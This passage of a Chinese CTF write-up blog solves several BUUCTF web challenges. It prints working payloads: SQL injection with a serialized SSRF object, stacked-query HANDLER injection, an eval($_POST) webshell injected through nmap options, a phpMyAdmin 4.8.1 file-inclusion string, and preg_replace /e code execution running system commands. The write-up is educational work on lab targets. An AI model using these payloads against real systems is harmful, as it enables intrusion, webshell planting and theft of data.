src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210724221156289.png" alt="image-20210724221156289"></p><p>这里能看出来data是个序列化后的结果，但是不知道有什么用</p><p>然后扫一下发现</p><p>有robots.txt备份文件</p><pre class="language-none"><code class="language-none">&lt;?phpclass UserInfo&#123;    public $name &#x3D; &quot;&quot;;    public $age &#x3D; 0;    public $blog &#x3D; &quot;&quot;;    public function __construct($name, $age, $blog)    &#123;        $this-&gt;name &#x3D; $name;        $this-&gt;age &#x3D; (int)$age;        $this-&gt;blog &#x3D; $blog;    &#125;    function get($url)    &#123;        $ch &#x3D; curl_init();        curl_setopt($ch, CURLOPT_URL, $url);        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);        $output &#x3D; curl_exec($ch);        $httpCode &#x3D; curl_getinfo($ch, CURLINFO_HTTP_CODE);        if($httpCode &#x3D;&#x3D; 404) &#123;            return 404;        &#125;        curl_close($ch);        return $output;    &#125;    public function getBlogContents ()    &#123;        return $this-&gt;get($this-&gt;blog);    &#125;    public function isValidBlog ()    &#123;        $blog &#x3D; $this-&gt;blog;        return preg_match(&quot;&#x2F;^(((http(s?))\:\&#x2F;\&#x2F;)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\&#x2F;\S*)?$&#x2F;i&quot;, $blog);    &#125;&#125;</code></pre><p>好，看不懂了（</p><p>抄一下别人的分析</p><pre class="language-none"><code class="language-none">&lt;?php  class UserInfo&#123;    public $name &#x3D; &quot;&quot;;    public $age &#x3D; 0;    public $blog &#x3D; &quot;&quot;;     public function __construct($name, $age, $blog)    &#123;        $this-&gt;name &#x3D; $name;        $this-&gt;age &#x3D; (int)$age;        $this-&gt;blog &#x3D; $blog;    &#125;     function get($url)    &#123;        $ch &#x3D; curl_init();        &#x2F;*curl_init()：初始化一个 cURL 会话并且全部的选项都被设置后被调用*&#x2F;         curl_setopt($ch, CURLOPT_URL, $url);        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);        &#x2F;*            curl_setopt — 为给定的cURL会话句柄设置一个选项。                说明：                    bool curl_setopt ( resource $ch , int $option , mixed $value )                参数:                    ch：由 curl_init() 返回的 cURL 句柄。                    option：需要设置的CURLOPT_XXX选项。                    value：将设置在option选项上的值。                    对于下面的这些option的可选参数，value应该被设置一个bool类型的值：                        CURLOPT_RETURNTRANSFER：将curl_exec()获取的信息以文件流的形式返回，而不是直接输出。                    对于下面的这些option的可选参数，value应该被设置一个string类型的值：                        CURLOPT_URL：需要获取的URL地址，也可以在curl_init()函数中设置。                                                                          ###################                        文件流的形式:指的是在传递过程中的文件,比如你上传一张图片,那么他不是以一个完整的图片传输的,是将文件按特定编码的字符传输.这个就是文件流        *&#x2F;        $output &#x3D; curl_exec($ch);        &#x2F;*curl_exec ：执行 cURL 会话*&#x2F;        $httpCode &#x3D; curl_getinfo($ch, CURLINFO_HTTP_CODE);        &#x2F;*            curl_getinfo — 获取一个cURL连接资源句柄的信息                说明：                       mixed curl_getinfo ( resource $ch [, int $opt &#x3D; 0 ] )获取最后一次传输的相关信息。                参数：                      ch 由 curl_init() 返回的 cURL 句柄。                      opt：这个参数可能是以下常量之一:                            CURLINFO_HTTP_CODE : 最后一个收到的HTTP代码        *&#x2F;                 if($httpCode &#x3D;&#x3D; 404) &#123;            return 404;        &#125;        curl_close($ch);         return $output;    &#125;     public function getBlogContents ()    &#123;        return $this-&gt;get($this-&gt;blog);    &#125;     public function isValidBlog ()    &#123;        $blog &#x3D; $this-&gt;blog;        return preg_match(&quot;&#x2F;^(((http(s?))\:\&#x2F;\&#x2F;)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\&#x2F;\S*)?$&#x2F;i&quot;, $blog);    &#125;        cURL是一个利用URL语法在命令行下工作的文件传输工具，1997年首次发行。它支持文件上传和下载，所以是综合传输工具，但按传统，习惯称cURL为下载工具。    cURL还包含了用于程序开发的libcurl。PHP支持的由Daniel Stenberg创建的libcurl库允许你与各种的服务器使用各种类型的协议进行连接和通讯。libcurl目前支持http、https、ftp、gopher、telnet、dict、file和ldap协议。libcurl同时也支持HTTPS认证、HTTP POST、HTTP PUT、 FTP 上传(这个也能通过PHP的FTP扩展完成)、HTTP 基于表单的上传、代理、cookies和用户名+密码的认证。PHP中使用cURL实现Get和Post请求的方法这些函数在PHP 4.0.2中被引入。 </code></pre><p>新知识：这里利用了ssrf漏洞</p><p><a href="https://www.freebuf.com/company-information/220086.html">SSRF漏洞攻击原理及防御方案 - FreeBuf网络安全行业门户</a></p><p><a href="https://blog.csdn.net/fageweiketang/article/details/88983921"> SSRF 漏洞记录_发哥微课堂-CSDN博客</a></p><p><a href="https://www.t00ls.net/articles-41070.html">SSRF漏洞(原理&amp;绕过姿势) - T00ls.Net</a></p><p>SSRF（Server-Side Request Forgery）也属于应用层上的一个漏洞类型，用一个最简单的例子来理解这个漏洞：比如一个添加图文的功能，填入标题内容和封面图然后提交在网站前台显示，对于这个功能的图片它除了可以让你上传以外，还支持填入远程图片地址，如果你填入了远程的图片地址，则该网站会加载远程图过来进行显示，而如果程序写法不严谨或者过滤不严格，则加载图片地址的这个功能可能就可以包含进行一些恶意的脚本文件，或者你输入内网的 ip 或者一些系统的文件都会被解析执行，这个我们一般叫它 SSRF 即服务端请求伪造。</p><p>curl 使用的经典过程，初始化，然后设置访问的地址，随后执行，最后关闭。</p><p>将URL换成file://的形式，就可以读取本地文件。</p><p>这里我们要访问的是flag.php，所以按照之前sql注入得出来的序列化内容进行修改</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210724225352853.png" alt="image-20210724225352853"></p><p>最终payload为</p><pre class="language-none"><code class="language-none">?no&#x3D;-1%20union&#x2F;**&#x2F;select 1,(select%20group_concat(no,username,passwd,data)%20from%20users),3,&#39;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;age&quot;;i:123;s:4:&quot;blog&quot;;s:27:&quot;file:&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php&quot;;&#125;&#39;</code></pre><p>看一下源码，找到flag</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210724225327036.png" alt="image-20210724225327036"></p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210724225342961.png" alt="image-20210724225342961"></p><h2 id="GYCTF2020-Blacklist"><a href="#GYCTF2020-Blacklist" class="headerlink" title="[GYCTF2020]Blacklist"></a>[GYCTF2020]Blacklist</h2><p>这个看起来和强网杯那个有点像</p><p>同样也是堆叠注入</p><p>可以用</p><p>1&#39;;show tables;#查表</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210725230626425.png" alt="image-20210725230626425"></p><p>flag应该就在flaghere这个表里</p><p>看一下列名</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210725231110024.png" alt="image-20210725231110024"></p><p>想查看的时候发现存在过滤</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210725231208544.png" alt="image-20210725231208544"></p><p>这里可以利用headler</p><p>HANDLER … OPEN语句打开一个表，使其可以使用后续HANDLER … READ语句访问，该表对象未被其他会话共享，并且在会话调用HANDLER … CLOSE或会话终止之前不会关闭</p><p>最终payload：1&#39;;handler FlagHere open;handler FlagHere read first;handler FlagHere close;#</p><p>（试了一下利用headler强网杯的拿到也能注出来</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210725231720309.png" alt="image-20210725231720309"></p><p><strong>关于handler命令</strong><br>转载自:<a href="https://blog.csdn.net/jesseyoung/article/details/40785137">https://blog.csdn.net/jesseyoung/article/details/40785137</a></p><p>mysql除可使用select查询表中的数据，也可使用handler语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过handler语句并不具备select语句的所有功能。它是mysql专用的语句，并没有包含到SQL标准中。<br>HANDLER语句提供通往表的直接通道的存储引擎接口，可以用于MyISAM和InnoDB表。</p><p>基本语法：</p><pre class="language-none"><code class="language-none">HANDLER tbl_name OPEN [ [AS] alias]HANDLER tbl_name READ index_name &#123; &#x3D; | &lt;&#x3D; | &gt;&#x3D; | &lt; | &gt; &#125; (value1,value2,...)    [ WHERE where_condition ] [LIMIT ... ]HANDLER tbl_name READ index_name &#123; FIRST | NEXT | PREV | LAST &#125;    [ WHERE where_condition ] [LIMIT ... ]HANDLER tbl_name READ &#123; FIRST | NEXT &#125;    [ WHERE where_condition ] [LIMIT ... ]HANDLER tbl_name CLOSE</code></pre><p>通过HANDLER tbl_name OPEN打开一张表，无返回结果，实际上我们在这里声明了一个名为tb1_name的句柄。<br>通过HANDLER tbl_name READ FIRST获取句柄的第一行，通过READ NEXT依次获取其它行。最后一行执行之后再执行NEXT会返回一个空的结果。<br>通过HANDLER tbl_name CLOSE来关闭打开的句柄。</p><p>通过索引去查看的话可以按照一定的顺序，获取表中的数据。<br>通过HANDLER tbl_name READ index_name FIRST，获取句柄第一行（索引最小的一行），NEXT获取下一行，PREV获取前一行，LAST获取最后一行（索引最大的一行）。</p><p>通过索引列指定一个值，可以指定从哪一行开始。<br>通过HANDLER tbl_name READ index_name = value，指定从哪一行开始，通过NEXT继续浏览。</p><p>如果我们不想浏览一个表的所有行，可以使用where和limit子句。</p><h2 id="GXYCTF2019-BabyUpload"><a href="#GXYCTF2019-BabyUpload" class="headerlink" title="[GXYCTF2019]BabyUpload"></a>[GXYCTF2019]BabyUpload</h2><p>这个和之前一个文件上传的题差不多，上传时过滤了ph后缀名，所以要上传个图片马，同时还要上传个.htaccess文件解析图片马，用bp抓包把类型改成image/jpeg就行</p><p>然后菜刀练一下在根目录里就能找到flag</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210803230538636.png" alt="image-20210803230538636"></p><h2 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h2><p>先直接贴参考的文章了</p><p>[BUUCTF__<a href="https://blog.csdn.net/tm_1024/article/details/107393796?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_title~default-0.control&spm=1001.2101.3001.4242">BUUCTF 2018]Online Tool_题解_风过江南乱的博客-CSDN博客</a></p><p>[<a href="https://blog.csdn.net/weixin_44077544/article/details/102835099?utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.control&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.control">BUUCTF 2018]Online Tool_沐目的博客-CSDN博客</a></p><p><a href="http://www.lmxspace.com/2018/07/16/%E8%B0%88%E8%B0%88escapeshellarg%E5%8F%82%E6%95%B0%E7%BB%95%E8%BF%87%E5%92%8C%E6%B3%A8%E5%85%A5%E7%9A%84%E9%97%AE%E9%A2%98/#2-CVE-2016-10045">谈谈escapeshellarg参数绕过和注入的问题 (lmxspace.com)</a></p><p><a href="https://paper.seebug.org/164/">PHP escapeshellarg()+escapeshellcmd() 之殇 (seebug.org)</a></p><p>[2020/7/08 - <a href="https://blog.csdn.net/zhangxiansheng12/article/details/107216167/">BUUCTF 2018]Online Tool - nmap\escapeshellarg与escapeshellcmd连用_M4xlmum的博客-CSDN博客</a></p><p>先是代码审计，又是没见过的东西</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210804001517374.png" alt="image-20210804001517374"></p><p>第一个if语句好像没啥用</p><p>在PHP 中使用 <em><strong>*$_SERVER[&quot;REMOTE_ADDR&quot;]*</strong></em> 来取得客户端的 IP地址，但如果客户端是使用代理服务器来访问，那取到的就</p><p>是代理服务器的 IP 地址，而不是真正的客户端 IP 地址。要想透过代理服务器取得客户端的真实 IP 地址，就要使用</p><p><em><strong>*$_SERVER[&quot;HTTP_X_FORWARDED_FOR&quot;]*</strong></em> 来读取。</p><p>不过要注意的事，并不是每个代理服务器都能用 $_SERVER[&quot;HTTP_X_FORWARDED_FOR&quot;] 来读取客户端的真实IP，有些用此</p><p>方法读取到的仍然是代理服务器的 IP。</p><p>第二个if语句是要求传入一个参数然后利用escapeshellarg和escapeshellcmd两个函数的漏洞实现system命令执行</p><pre class="language-none"><code class="language-none">&#96;escapeshellarg&#96;，会在字符串中所有的单引号（包括成对存在闭合的）前添加一个&#96;&#39;\&#39;&#96; ，若已经用&#96;\&#96;转义，则会用并且用&#96;&#39;\&#39;&#96; 替换&#96;\&#96;，最后将整个变量用单引号包裹。escapeshellcmd&#96;，会将字符串中未被转义的双引号或单引号转义（成对存在闭合的双引号或单引号除外）若已被转义，则用&#96;\\\&quot;&#96;或&#96;\\\&#39;&#96;替&#96;\&quot;&#96;或&#96;\&#39;</code></pre><p>这个漏洞类似这种</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210804005109985.png" alt="image-20210804005109985"></p><p>mkdir命令是Linux中的新建文件夹</p><p>chdir改变目录</p><p>最后就是system的命令执行了，这里面是nmap的一些命令</p><p>-T5 :扫描等级,越大越快,越快越不安全,最好设置为-T4</p><p>-sT :TCP connent 扫描,不太安全(留下记录信息),而且速度较慢,一般先使用-sS测试</p><p>-Pn :禁用ping</p><p>-host-timeout 2:设置扫描一台主机的时间，以毫秒为单位。</p><p>-F :快速扫描模式，只扫描在nmap-services文件中列出的端口。</p><p>-oG test.txt: 将扫描结果生成 test.txt 文件</p><p>接下来就是想办法利漏洞给里面传入一个一句话木马</p><p>payload</p><pre class="language-none"><code class="language-none">&#39;&lt;?php eval($_POST[&quot;a&quot;]);?&gt; -oG 1.php &#39;</code></pre><p>然后经过escapeshellarg和escapeshellcmd两个函数就会变成类似这种</p><pre class="language-none"><code class="language-none">&#39; &#39;\\&#39;&#39;\&lt;\?php eval\(\)\;\?\&gt; -oG 1.php &#39;\\&#39;&#39; &#39;</code></pre><p>这里单引号都闭合了不会影响到传入的一句话木马</p><p>之后就可以用菜刀连接找flag了</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210804004604659.png" alt="image-20210804004604659"></p><p> e9612257fa1c5134d014e95a7440d357</p><p>这是上传后的地址</p><p>菜刀连一下<a href="http://d26a51d3-a34a-46e5-9be3-80b3a129befb.node4.buuoj.cn/">http://d26a51d3-a34a-46e5-9be3-80b3a129befb.node4.buuoj.cn/</a> e9612257fa1c5134d014e95a7440d357/1.php</p><p>根目录找到flag</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210804004814988.png" alt="image-20210804004814988"></p><h2 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h2><p>首先是个登录框</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210808124202495.png" alt="image-20210808124202495"></p><p>看一下help的内容</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210808124233134.png" alt="image-20210808124233134"></p><p>试试抓包然后改一下请求方式后会下载一个word文档，没啥用</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210808124659707.png" alt="image-20210808124659707"></p><p>这里有个漏洞WEB-INF/web.xml泄露</p><pre class="language-none"><code class="language-none">WEB-INF主要包含一下文件或目录:&#x2F;WEB-INF&#x2F;web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。&#x2F;WEB-INF&#x2F;classes&#x2F;：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中&#x2F;WEB-INF&#x2F;lib&#x2F;：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件&#x2F;WEB-INF&#x2F;src&#x2F;：源码目录，按照包名结构放置各个java文件。&#x2F;WEB-INF&#x2F;database.properties：数据库配置文件漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码</code></pre><p>漏洞成因</p><pre class="language-none"><code class="language-none">通常一些web应用我们会使用多个web服务器搭配使用，解决其中的一个web服务器的性能缺陷以及做均衡负载的优点和完成一些分层结构的安全策略等。在使用这种架构的时候，由于对静态资源的目录或文件的映射配置不当，可能会引发一些的安全问题，导致web.xml等文件能够被读取。漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码。一般情况，jsp引擎默认都是禁止访问WEB-INF目录的，Nginx 配合Tomcat做均衡负载或集群等情况时，问题原因其实很简单，Nginx不会去考虑配置其他类型引擎（Nginx不是jsp引擎）导致的安全问题而引入到自身的安全规范中来（这样耦合性太高了），修改Nginx配置文件禁止访问WEB-INF目录就好了： location ~ ^&#x2F;WEB-INF&#x2F;* &#123; deny all; &#125; 或者return 404; 或者其他！</code></pre><p>漏洞利用</p><pre class="language-none"><code class="language-none">漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码</code></pre><p>所以先访问一下WEB-INF/web.xml</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210808125056946.png" alt="image-20210808125056946"></p><p>这个路径com.wm.ctf.IndexController应该和flag有关</p><p>所以试试访问一下</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210808131605144.png" alt="image-20210808131605144"></p><p>看到有块类似base64</p><p>解码得到flag</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210808131703878.png" alt="image-20210808131703878"></p><h2 id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h2><p>[(1条消息) BUU-WEB-<a href="https://blog.csdn.net/qq_24033605/article/details/116855740?utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.control&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.control">GXYCTF2019]禁止套娃_TzZzEZ-web的博客-CSDN博客</a></p><p>[<a href="https://www.cnblogs.com/wangtanzhi/p/12260986.html">GXYCTF2019]禁止套娃 - 王叹之 - 博客园 (cnblogs.com)</a></p><p>题目存在git泄露，用GitHack扫一下得到源码</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210808134953571.png" alt="image-20210808134953571"></p><p>可以猜到这里利用了eval进行命令执行，但是过滤了很多东西</p><pre class="language-none"><code class="language-none">1.需要以GET形式传入一个名为exp的参数。如果满足条件会执行这个exp参数的内容。2.过滤了常用的几个伪协议，不能以伪协议读取文件。3.(?R)引用当前表达式，后面加了?递归调用。只能匹配通过无参数的函数。4.正则匹配掉了et&#x2F;na&#x2F;info等关键字，很多函数都用不了。5：eval($_GET[&#39;exp&#39;]); 典型的无参数RCE</code></pre><p><a href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/#%E4%BB%80%E4%B9%88%E6%98%AF%E6%97%A0%E5%8F%82%E6%95%B0%E5%87%BD%E6%95%B0RCE">PHP Parametric Function RCE · sky&#39;s blog (skysec.top)</a>关于无参数rce</p><p>首先要读取目录内容，</p><p>可以用print_r(scandir(&#39;.&#39;));</p><p>但是因为不能传参，所以要想把.用函数代替</p><p>这里有两个函数可以利用</p><pre class="language-none"><code class="language-none">localeconv() 函数返回一包含本地数字及货币格式信息的数组。而数组第一项就是.current() 返回数组中的当前单元, 默认取第一个值</code></pre><p>所以current(localeconv())永远是个.</p><p>也就可以用print_r(scandir(current(localeconv())));来读目录</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210808142444979.png" alt="image-20210808142444979"></p><p>可以看到flag就在flag.php中</p><p>现在要想办法把它读出来</p><p>这里可以利用array_reverse()和next函数</p><p>通过array_reverse() 函数返回翻转顺序的数组。<br>（反转之后flag.php被放在第二个数组之中）<br>next() 函数将内部指针指向数组中的下一个元素，并输出。<br>payload为：</p><pre class="language-php" data-language="php"><code class="language-php">？exp&#x3D;show_source(next(array_reverse(scandir(pos(localeconv())))));</code></pre><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210808144017189.png" alt="image-20210808144017189"></p><p>也可以利用</p><p>array_flip()交换数组的键和值</p><p>array_rand()从数组中随机取出一个或多个单元</p><p>最后再利用readfile函数读出文件或者用show_source让它高亮显示</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210808144253823.png" alt="image-20210808144253823"></p><p>由于array_rand是随机的，所以要多刷新几次才可能会显示flag.php的内容</p><h2 id="GWCTF-2019-我有一个数据库"><a href="#GWCTF-2019-我有一个数据库" class="headerlink" title="[GWCTF 2019]我有一个数据库"></a>[GWCTF 2019]我有一个数据库</h2><p>御剑是真的不好用。。。phpmyadmin路径死活扫不出来</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210808154118587.png" alt="image-20210808154118587"></p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210808150229023.png" alt="image-20210808150229023"></p><p>这里phpmyadmin版本是4.8.1</p><p>由于phpmyadmin4.8.0-4.8.1存在文件包含漏洞</p><p>直接用payload打</p><p>?target=db_datadict.php%253f/../../../../../../../../flag</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210808150605205.png" alt="image-20210808150605205"></p><h2 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h2><p>这道题第一眼看上去像是本地访问的题目</p><p>但是hint有感觉不太像</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210808201950916.png" alt="image-20210808201950916"></p><p>抓包修改xff头后就没思路了，查了一下发现是smarty模板注入</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210808202158856.png" alt="image-20210808202158856"></p><p>看到这里支持逻辑运算，可以直接解析，所以就可以利用系统命令来读flag</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210808202307003.png" alt="image-20210808202307003"></p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210808202546370.png" alt="image-20210808202546370"></p><p><strong>Smarty SSTI利用</strong></p><p><a href="https://blog.csdn.net/qq_45521281/article/details/107556915">(1条消息) PHP的模板注入（Smarty模板）_WHOAMIAnony的博客-CSDN博客_smarty模板注入</a></p><p>Smarty是基于PHP开发的，对于Smarty的SSTI的利用手段与常见的flask的SSTI有很大区别。</p><p><strong>漏洞确认</strong></p><p>一般情况下输入{$smarty.version}就可以看到返回的smarty的版本号。</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210808202952019.png" alt="image-20210808202952019"></p><p><strong>常规利用方式</strong></p><p>Smarty支持使用<code>&#123;php&#125;&#123;/php&#125;</code>标签来执行被包裹其中的php指令，最常规的思路自然是先测试该标签。</p><p><strong>{literal} 标签</strong></p><blockquote><p><strong><code>&#123;literal&#125;</code>可以让一个模板区域的字符原样输出。</strong> 这经常用于保护页面上的Javascript或css样式表，避免因为Smarty的定界符而错被解析。</p></blockquote><p>若该题环境为php5，则可以</p><pre class="language-none"><code class="language-none">&lt;script&gt;language&#x3D;&quot;php&quot;&gt;phpinfo();&lt;&#x2F;script&gt;</code></pre><p><strong>静态方法</strong></p><p>通过self获取Smarty类再调用其静态方法实现文件读写被网上很多文章采用。</p><p><strong>在3.1.30的Smarty版本中官方已经把该静态方法删除</strong></p><p><strong>{if}标签</strong><br>官方文档中看到这样的描述：</p><p>Smarty的{if}条件判断和PHP的if非常相似，只是增加了一些特性。每个{if}必须有一个配对的{/if}，也可以使用{else} 和 {elseif}，全部的PHP条件表达式和函数都可以在if内使用，如||<em>, or, &amp;&amp;, and, is_array(), 等等，如：{if is_array($array)}{/if}</em></p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210808203333956.png" alt="image-20210808203333956"></p><h2 id="BJDCTF2020-ZJCTF，不过如此"><a href="#BJDCTF2020-ZJCTF，不过如此" class="headerlink" title="[BJDCTF2020]ZJCTF，不过如此"></a>[BJDCTF2020]ZJCTF，不过如此</h2><p>第一部分</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210809002920929.png" alt="image-20210809002920929"></p><p>可以用伪协议读取，但是不知道为什么我用hackbar时没成功</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210808225403216.png" alt="image-20210808225403216"></p><p>也可以用这个payload</p><pre class="language-none"><code class="language-none">text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,SSBoYXZlIGEgZHJlYW0&#x3D;&amp;file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;next.php</code></pre><p>base64解码</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210808225453870.png" alt="image-20210808225453870"></p><p>当pattern传入的正则表达式带有/e时，存在命令执行，即当匹配到符合正则表达式的字符串时，第二个参数的字符串可被当做代码来执行。思路是利用这个代码执行，执行源码中的getFlag()函数，在传入cmd参数，再利用getFlag中的eval（）函数，再进行一个代码执行。</p><p><a href="https://xz.aliyun.com/t/2557">深入研究preg_replace与代码执行 - 先知社区 (aliyun.com)</a></p><p>这里第二个参数固定为<code>strtolower(&quot;\\1&quot;)</code>这里的<code>\\1</code>实际上体现为<code>\1</code></p><p> <strong>\1</strong> 在正则表达式中有自己的含义:</p><p><strong>反向引用</strong><br>对一个正则表达式模式或部分模式两边添加圆括号将导致相关匹配存储到一个临时缓冲区中，所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。缓冲区编号从 1 开始，最多可存储 99 个捕获的子表达式。每个缓冲区都可以使用 ‘\n’ 访问</p><p>这里的\1指的是第一个匹配项</p><p>这里我们就要利用这个漏洞来运行getflag函数，并同时给cmd传参，利用system来执行命令</p><p>为了实现运行getflag的目的，就要先让\1为getflag(),也就是传入</p><p> .*={${getFlag()}}</p><pre class="language-none"><code class="language-none">原先的语句： preg_replace(&#39;&#x2F;(&#39; . $regex . &#39;)&#x2F;ei&#39;, &#39;strtolower(&quot;\\1&quot;)&#39;, $value);变成了语句： preg_replace(&#39;&#x2F;(.*)&#x2F;ei&#39;, &#39;strtolower(&quot;\\1&quot;)&#39;,&#123;$&#123;getFlag()&#125;&#125;);</code></pre><p>这样通过preg_replace后就会运行getflag函数，但是由于php特性.传入后会变为_所以这里要利用正则匹配中的\S</p><p>所以传入的payload为\S*={${getFlag()}}</p><pre class="language-none"><code class="language-none">\S 在php正则表达式中表示匹配所有非空字符，*表示多次匹配</code></pre><p>最终payload为?\S*={${getFlag()}}&amp;cmd=system(&quot;cat /flag&quot;);</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210809001841771.png" alt="image-20210809001841771"></p><h2 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves 